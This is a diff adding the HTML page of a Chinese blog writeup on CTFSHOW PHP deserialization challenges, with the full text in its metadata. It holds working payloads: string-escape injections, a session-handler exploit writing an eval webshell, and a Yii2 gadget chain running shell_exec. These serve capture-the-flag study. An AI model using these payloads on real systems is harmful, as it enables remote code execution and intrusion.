@@ -1,0 +1,960 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CTFSHOW-反序列化-Writeup | Xrntkk&#39;s Blog</title>
+<meta name="keywords" content="writeup, ctf, Web">
+<meta name="description" content="PHP的魔法方法
+PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：
+ 1__construct()，类的构造函数
+ 2
+ 3__destruct()，类的析构函数
+ 4
+ 5__call()，在对象中调用一个不可访问方法时调用
+ 6
+ 7__callStatic()，用静态方式中调用一个不可访问方法时调用
+ 8
+ 9__get()，获得一个类的成员变量时调用
+10
+11__set()，设置一个类的成员变量时调用
+12
+13__isset()，当对不可访问属性调用isset()或empty()时调用
+14
+15__unset()，当对不可访问属性调用unset()时被调用。
+16
+17__sleep()，执行serialize()时，先会调用这个函数
+18
+19__wakeup()，执行unserialize()时，先会调用这个函数
+20
+21__toString()，类被当成字符串时的回应方法
+22
+23__invoke()，调用函数的方式调用一个对象时的回应方法
+24
+25__set_state()，调用var_export()导出类时，此静态方法会被调用。
+26
+27__clone()，当对象复制完成时调用
+28
+29__autoload()，尝试加载未定义的类
+30
+31__debugInfo()，打印所需调试信息
+web254
+1&lt;?php
+2
+3                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?&gt;&#39;;
+4    public $code=&#39;xrntkk&#39;;
+5}
+6
+7$poc = new ctfshowvip();
+8echo urlencode(serialize($poc));
+web262
+字符串逃逸">
+<meta name="author" content="Xrntkk">
+<link rel="canonical" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <meta name="referrer" content="no-referrer-when-downgrade">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.db3874ad7714b044ca574a35a48fc9a38e491dfc56e271a0c1a44fda4c8c0b3d.css" integrity="sha256-2zh0rXcUsETKV0o1pI/Jo45JHfxW4nGgwaRP2kyMCz0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
+  <meta property="og:title" content="CTFSHOW-反序列化-Writeup">
+  <meta property="og:description" content="PHP的魔法方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：
+1__construct()，类的构造函数 2 3__destruct()，类的析构函数 4 5__call()，在对象中调用一个不可访问方法时调用 6 7__callStatic()，用静态方式中调用一个不可访问方法时调用 8 9__get()，获得一个类的成员变量时调用 10 11__set()，设置一个类的成员变量时调用 12 13__isset()，当对不可访问属性调用isset()或empty()时调用 14 15__unset()，当对不可访问属性调用unset()时被调用。 16 17__sleep()，执行serialize()时，先会调用这个函数 18 19__wakeup()，执行unserialize()时，先会调用这个函数 20 21__toString()，类被当成字符串时的回应方法 22 23__invoke()，调用函数的方式调用一个对象时的回应方法 24 25__set_state()，调用var_export()导出类时，此静态方法会被调用。 26 27__clone()，当对象复制完成时调用 28 29__autoload()，尝试加载未定义的类 30 31__debugInfo()，打印所需调试信息 web254 1&lt;?php 2 3 ?&gt;&#39;; 4 public $code=&#39;xrntkk&#39;; 5} 6 7$poc = new ctfshowvip(); 8echo urlencode(serialize($poc)); web262 字符串逃逸">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2024-12-22T00:27:55+08:00">
+    <meta property="article:modified_time" content="2024-12-22T00:27:55+08:00">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web">
+      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
+<meta name="twitter:title" content="CTFSHOW-反序列化-Writeup">
+<meta name="twitter:description" content="PHP的魔法方法
+PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：
+ 1__construct()，类的构造函数
+ 2
+ 3__destruct()，类的析构函数
+ 4
+ 5__call()，在对象中调用一个不可访问方法时调用
+ 6
+ 7__callStatic()，用静态方式中调用一个不可访问方法时调用
+ 8
+ 9__get()，获得一个类的成员变量时调用
+10
+11__set()，设置一个类的成员变量时调用
+12
+13__isset()，当对不可访问属性调用isset()或empty()时调用
+14
+15__unset()，当对不可访问属性调用unset()时被调用。
+16
+17__sleep()，执行serialize()时，先会调用这个函数
+18
+19__wakeup()，执行unserialize()时，先会调用这个函数
+20
+21__toString()，类被当成字符串时的回应方法
+22
+23__invoke()，调用函数的方式调用一个对象时的回应方法
+24
+25__set_state()，调用var_export()导出类时，此静态方法会被调用。
+26
+27__clone()，当对象复制完成时调用
+28
+29__autoload()，尝试加载未定义的类
+30
+31__debugInfo()，打印所需调试信息
+web254
+1&lt;?php
+2
+3                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?&gt;&#39;;
+4    public $code=&#39;xrntkk&#39;;
+5}
+6
+7$poc = new ctfshowvip();
+8echo urlencode(serialize($poc));
+web262
+字符串逃逸">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTFSHOW-反序列化-Writeup",
+      "item": "http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTFSHOW-反序列化-Writeup",
+  "name": "CTFSHOW-反序列化-Writeup",
+  "description": "PHP的魔法方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：\n1__construct()，类的构造函数 2 3__destruct()，类的析构函数 4 5__call()，在对象中调用一个不可访问方法时调用 6 7__callStatic()，用静态方式中调用一个不可访问方法时调用 8 9__get()，获得一个类的成员变量时调用 10 11__set()，设置一个类的成员变量时调用 12 13__isset()，当对不可访问属性调用isset()或empty()时调用 14 15__unset()，当对不可访问属性调用unset()时被调用。 16 17__sleep()，执行serialize()时，先会调用这个函数 18 19__wakeup()，执行unserialize()时，先会调用这个函数 20 21__toString()，类被当成字符串时的回应方法 22 23__invoke()，调用函数的方式调用一个对象时的回应方法 24 25__set_state()，调用var_export()导出类时，此静态方法会被调用。 26 27__clone()，当对象复制完成时调用 28 29__autoload()，尝试加载未定义的类 30 31__debugInfo()，打印所需调试信息 web254 1\u0026lt;?php 2 3 ?\u0026gt;\u0026#39;; 4 public $code=\u0026#39;xrntkk\u0026#39;; 5} 6 7$poc = new ctfshowvip(); 8echo urlencode(serialize($poc)); web262 字符串逃逸\n",
+  "keywords": [
+    "writeup", "ctf", "Web"
+  ],
+  "articleBody": "PHP的魔法方法 PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：\n1__construct()，类的构造函数 2 3__destruct()，类的析构函数 4 5__call()，在对象中调用一个不可访问方法时调用 6 7__callStatic()，用静态方式中调用一个不可访问方法时调用 8 9__get()，获得一个类的成员变量时调用 10 11__set()，设置一个类的成员变量时调用 12 13__isset()，当对不可访问属性调用isset()或empty()时调用 14 15__unset()，当对不可访问属性调用unset()时被调用。 16 17__sleep()，执行serialize()时，先会调用这个函数 18 19__wakeup()，执行unserialize()时，先会调用这个函数 20 21__toString()，类被当成字符串时的回应方法 22 23__invoke()，调用函数的方式调用一个对象时的回应方法 24 25__set_state()，调用var_export()导出类时，此静态方法会被调用。 26 27__clone()，当对象复制完成时调用 28 29__autoload()，尝试加载未定义的类 30 31__debugInfo()，打印所需调试信息 web254 1\u003c?php 2 3 ?\u003e'; 4 public $code='xrntkk'; 5} 6 7$poc = new ctfshowvip(); 8echo urlencode(serialize($poc)); web262 字符串逃逸\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 02:37:19 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 16:05:38 9# @message.php 10# @email: h1xa@ctfer.com 11# @link: https://ctfer.com 12 13*/ 14 15 16error_reporting(0); 17class message{ 18 public $from; 19 public $msg; 20 public $to; 21 public $token='user'; 22 public function __construct($f,$m,$t){ 23 $this-\u003efrom = $f; 24 $this-\u003emsg = $m; 25 $this-\u003eto = $t; 26 } 27} 28 29$f = $_GET['f']; 30$m = $_GET['m']; 31$t = $_GET['t']; 32 33if(isset($f) \u0026\u0026 isset($m) \u0026\u0026 isset($t)){ 34 $msg = new message($f,$m,$t); 35 $umsg = str_replace('fuck', 'loveU', serialize($msg)); 36 setcookie('msg',base64_encode($umsg)); 37 echo 'Your message has been sent'; 38} 39 40highlight_file(__FILE__); message.php\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 15:13:03 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 15:17:17 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13highlight_file(__FILE__); 14include('flag.php'); 15 16class message{ 17 public $from; 18 public $msg; 19 public $to; 20 public $token='user'; 21 public function __construct($f,$m,$t){ 22 $this-\u003efrom = $f; 23 $this-\u003emsg = $m; 24 $this-\u003eto = $t; 25 } 26} 27 28if(isset($_COOKIE['msg'])){ 29 $msg = unserialize(base64_decode($_COOKIE['msg'])); 30 if($msg-\u003etoken=='admin'){ 31 echo $flag; 32 } 33} 我们的目的就是想办法让token等于admin\n信息传输的过程中使用的序列化和反序列化，存在字符串逃逸，通过逃逸我们可以使token=admin\n之前写过我就懒得重新写了\nhttps://ctf.show/writeups/706838\n首先先生成一段序列\n1\u003c?php 2class message{ 3 public $from; 4 public $msg; 5 public $to = '123'; 6 public $token='admin'; 7 8} 9$payload = new message(); 10echo serialize($payload); 11 12O:7:\"message\":4:{s:4:\"from\";N;s:3:\"msg\";N;s:2:\"to\";s:3:\"123\";s:5:\"token\";s:5:\"admin\";} 截取后面一部分作为to的值传入\npayload:\n?f=\u0026m=\u0026t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";} web263 访问/www.zip拿到源码\n审计代码我们可以在/inc/inc.php中找到这样一个危险方法\n假如username和password可控，我们就可以写入木马\n但是这是一个__destruct方法，想要触发必须要经过反序列化，那这道题哪里有进行反序列的地方呢\n文章 - 带你走进PHP session反序列化漏洞 - 先知社区\n这篇文章讲得很详细\n归根结底这个漏洞之所以存在是由于序列化和反序列化时使用的处理器不同造成的\nsession.serialize_handler定义的引擎有三种，如下表所示：\n处理器名称 存储格式 php 键名 + 竖线 + 经过serialize()函数序列化处理的值 php_binary 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值 php_serialize 经过serialize()函数序列化处理的数组 注：自 PHP 5.5.4 起可以使用 php_serialize\n这道题的php版本为7.3.11，默认使用的处理器为php_serialize\n而在/inc/inc.php中却设置处理器为php\n也就是说序列化和反序列化所使用的处理器不同\n所以我们可以根据php处理器的格式构造出payload\nexp：\n1\u003c?php 2 3class User{ 4 public $username; 5 public $password; 6 function __construct(){ 7 $this-\u003eusername = '1.php'; 8 $this-\u003epassword = '\u003c?php eval($_POST[1]);?\u003e'; 9 } 10} 11 12echo urlencode(base64_encode('|'.serialize(new User()))); 13 14?\u003e 我们将cookie中的limit修改为我们序列化后的结果\n/index.php\n1\tif(isset($_SESSION['limit'])){ 2\t$_SESSION['limti']\u003e5?die(\"登陆失败次数超过限制\"):$_SESSION['limit']=base64_decode($_COOKIE['limit']); 3\t$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1); 4\t}else{ 5\tsetcookie(\"limit\",base64_encode('1')); 6\t$_SESSION['limit']= 1; 7\t} 修改后访问/check.php进行反序列化\n最后访问/log-1.php\n成功写入\nweb264 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 02:37:19 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 16:05:38 9# @message.php 10# @email: h1xa@ctfer.com 11# @link: https://ctfer.com 12 13*/ 14 15 16error_reporting(0); 17session_start(); 18 19class message{ 20 public $from; 21 public $msg; 22 public $to;1 23 public function __construct($f,$m,$t){ 24 $this-\u003efrom = $f; 25 $this-\u003emsg = $m; 26 $this-\u003eto = $t; 27 } 28} 29 30$f = $_GET['f']; 31$m = $_GET['m']; 32$t = $_GET['t']; 33 34if(isset($f) \u0026\u0026 isset($m) \u0026\u0026 isset($t)){ 35 $msg = new message($f,$m,$t); 36 $umsg = str_replace('fuck', 'loveU', serialize($msg)); 37 $_SESSION['msg']=base64_encode($umsg); 38 echo 'Your message has been sent'; 39} 40 41highlight_file(__FILE__); message.php\n1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-03 15:13:03 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-03 15:17:17 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13session_start(); 14highlight_file(__FILE__); 15include('flag.php'); 16 17class message{ 18 public $from; 19 public $msg; 20 public $to; 21 public $token='user'; 22 public function __construct($f,$m,$t){ 23 $this-\u003efrom = $f; 24 $this-\u003emsg = $m; 25 $this-\u003eto = $t; 26 } 27} 28 29if(isset($_COOKIE['msg'])){ 30 $msg = unserialize(base64_decode($_SESSION['msg'])); 31 if($msg-\u003etoken=='admin'){ 32 echo $flag; 33 } 34} 这题是修复了web262的非预期解，也就是可以直接在message.php修改cookie进行反序列化\n所以解法同web262\npayload:\n?f=1\u0026m=1\u0026t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck\";s:5:\"token\";s:5:\"admin\";} 注意要在message.php的cookie中加上msg=1\nweb265 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-04 23:52:24 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-05 00:17:08 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14error_reporting(0); 15include('flag.php'); 16highlight_file(__FILE__); 17class ctfshowAdmin{ 18 public $token; 19 public $password; 20 21 public function __construct($t,$p){ 22 $this-\u003etoken=$t; 23 $this-\u003epassword = $p; 24 } 25 public function login(){ 26 return $this-\u003etoken===$this-\u003epassword; 27 } 28} 29 30$ctfshow = unserialize($_GET['ctfshow']); 31$ctfshow-\u003etoken=md5(mt_rand()); 32 33if($ctfshow-\u003elogin()){ 34 echo $flag; 35} 这题指针引用使password恒等于token即可\nexp\n1\u003c?php 2 class ctfshowAdmin{ 3 public $token; 4 public $password; 5 6 public function __construct($t,$p){ 7 $this-\u003etoken=$t; 8 $this-\u003epassword = $p; 9 } 10 } 11 $a = new ctfshowAdmin(\"我能打上海major\",\"全场欢呼！DANKING！DANKING！\"); 12 $a-\u003epassword = \u0026$a-\u003etoken; 13 echo urlencode(serialize($a)); web266 1\u003c?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-12-04 23:52:24 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-12-05 00:17:08 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14highlight_file(__FILE__); 15 16include('flag.php'); 17$cs = file_get_contents('php://input'); 18 19 20class ctfshow{ 21 public $username='xxxxxx'; 22 public $password='xxxxxx'; 23 public function __construct($u,$p){ 24 $this-\u003eusername=$u; 25 $this-\u003epassword=$p; 26 } 27 public function login(){ 28 return $this-\u003eusername===$this-\u003epassword; 29 } 30 public function __toString(){ 31 return $this-\u003eusername; 32 } 33 public function __destruct(){ 34 global $flag; 35 echo $flag; 36 } 37} 38$ctfshowo=@unserialize($cs); 39if(preg_match('/ctfshow/', $cs)){ 40 throw new Exception(\"Error $ctfshowo\",1); 41} php大小写不敏感，大小写绕过\nexp\n1\u003c?php 2class Ctfshow{ 3 4} 5echo serialize(new Ctfshow()); O:7:\"Ctfshow\":0:{} web267 考点：Yii2 反序列化漏洞\n有一个登录入口\n弱口令成功登入admin/admin\n在/index.php?r=site%2Fabout处查看源代码看到hint\n访问/index.php?r=site%2Fabout\u0026view-source\n题目给出了入口点\n从源码中我们可以知道这道题用的是yii框架，而且为2.0版本\nyii反序列化漏洞复现及利用_yii框架漏洞-CSDN博客\n直接用poc总感觉缺了点什么，那自己搓一搓吧，但是过程就不放在这里了\n\u003c?php\rnamespace yii\\rest{\rclass IndexAction{\rpublic $checkAccess;\rpublic $id;\rpublic function __construct(){\r$this-\u003echeckAccess = 'shell_exec';\r$this-\u003eid = 'cat /flag | tee 1';//命令执行\r}\r}\r}\rnamespace Faker {\ruse yii\\rest\\IndexAction;\rclass Generator\r{\rprotected $formatters;\rpublic function __construct()\r{\r$this-\u003eformatters['close'] = [new IndexAction(), 'run'];\r}\r}\r}\rnamespace yii\\db{\ruse Faker\\Generator;\rclass BatchQueryResult{\rprivate $_dataReader;\rpublic function __construct()\r{\r$this-\u003e_dataReader=new Generator();\r}\r}\r}\rnamespace{\ruse yii\\db\\BatchQueryResult;\recho base64_encode(serialize(new BatchQueryResult()));\r} 没回显，用tee将输出复制到1文件中\npayload\n?r=backdoor/shell\u0026code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YV\rJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaV\rxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czoxNzoiY2F0IC9mbGFnIHwgdGVlID\rEiO31pOjE7czozOiJydW4iO319fX0= ",
+  "wordCount" : "2579",
+  "inLanguage": "zh",
+  "image": "https://i.postimg.cc/7hwBy7VS/calcr.png","datePublished": "2024-12-22T00:27:55+08:00",
+  "dateModified": "2024-12-22T00:27:55+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "Xrntkk"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/post/ctfshow/ctfshow_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Xrntkk's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Xrntkk&#39;s Blog (Alt + H)">Xrntkk&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Xrntkk&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CTFSHOW-反序列化-Writeup
+    </h1>
+<div class="post-meta"><span title='2024-12-22 00:27:55 +0800 CST'>2024-12-22</span>&nbsp;·&nbsp;6 分钟&nbsp;·&nbsp;Xrntkk
+
+<div class="meta-item">&nbsp·&nbsp
+  <span id="busuanzi_container_page_pv">Readings: <span id="busuanzi_value_page_pv"></span></span>
+  </div>      
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">目录</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#php%e7%9a%84%e9%ad%94%e6%b3%95%e6%96%b9%e6%b3%95" aria-label="PHP的魔法方法">PHP的魔法方法</a></li>
+                <li>
+                    <a href="#web254" aria-label="web254">web254</a></li>
+                <li>
+                    <a href="#web262" aria-label="web262">web262</a></li>
+                <li>
+                    <a href="#web263" aria-label="web263">web263</a></li>
+                <li>
+                    <a href="#web264" aria-label="web264">web264</a></li>
+                <li>
+                    <a href="#web265" aria-label="web265">web265</a></li>
+                <li>
+                    <a href="#web266" aria-label="web266">web266</a></li>
+                <li>
+                    <a href="#web267" aria-label="web267">web267</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h4 id="php的魔法方法">PHP的魔法方法<a hidden class="anchor" aria-hidden="true" href="#php的魔法方法">#</a></h4>
+<p>PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 常见的魔法方法如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-scss" data-lang="scss"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nt">__construct</span><span class="o">()</span><span class="err">，</span><span class="nt">类的构造函数</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nt">__destruct</span><span class="o">()</span><span class="err">，</span><span class="nt">类的析构函数</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="nt">__call</span><span class="o">()</span><span class="err">，</span><span class="nt">在对象中调用一个不可访问方法时调用</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="nt">__callStatic</span><span class="o">()</span><span class="err">，</span><span class="nt">用静态方式中调用一个不可访问方法时调用</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="nt">__get</span><span class="o">()</span><span class="err">，</span><span class="nt">获得一个类的成员变量时调用</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="nt">__set</span><span class="o">()</span><span class="err">，</span><span class="nt">设置一个类的成员变量时调用</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nt">__isset</span><span class="o">()</span><span class="err">，</span><span class="nt">当对不可访问属性调用isset</span><span class="o">()</span><span class="nt">或empty</span><span class="o">()</span><span class="nt">时调用</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">
